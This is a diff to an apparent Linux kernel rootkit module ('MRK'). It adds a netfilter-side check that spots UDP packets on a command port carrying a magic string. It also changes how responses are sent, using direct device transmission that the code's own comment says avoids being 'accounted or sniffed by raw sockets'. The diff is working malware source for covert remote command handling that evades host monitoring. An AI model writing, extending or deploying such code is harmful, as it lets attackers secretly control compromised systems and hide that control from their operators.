@@ -5,6 +5,8 @@
 #include <linux/tcp.h>
 #include <linux/udp.h>
 #include <linux/workqueue.h>
+#include <linux/fs.h>
+#include <linux/list.h>
 
 #include "headers/main.h"
 
@@ -122,7 +124,13 @@ static int send_response(
 
     skb->dev = dev;
 
-    return dev_queue_xmit(skb);
+    // We want to trasmit the packet directly so it won't be accounted or sniffed by raw sockets.
+    // Therefore, we use `dev_direct_xmit` instead of the standard `dev_queue_xmit`.
+
+    // The rx_queue index must be smaller then dev->real_num_rx_queues, otherwise a warning will be thrown.
+    // TODO: Should the selected queue be randomized?
+    if (skb->dev->real_num_rx_queues == 0) return -1;
+    return dev_direct_xmit(skb, 0);
 }
 
 struct MRK_command_work {
@@ -181,6 +189,25 @@ static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
         }
     }
     return NULL;
+}
+
+int is_skb_cmd(struct sk_buff *skb) {
+    struct iphdr *iph;
+    struct udphdr *udph;
+    const char *user_data;
+    int user_data_len;
+
+    iph = ip_hdr(skb);
+    if (iph->protocol != IPPROTO_UDP) return 0;
+
+    udph = udp_hdr(skb);
+    if (ntohs(udph->dest) != CMD_PORT) return 0;
+
+    user_data_len = get_udp_user_data(skb, &user_data);
+
+    if (user_data_len < CMD_MAGIC_LEN) return 0;
+
+    return !strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN);
 }
 
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
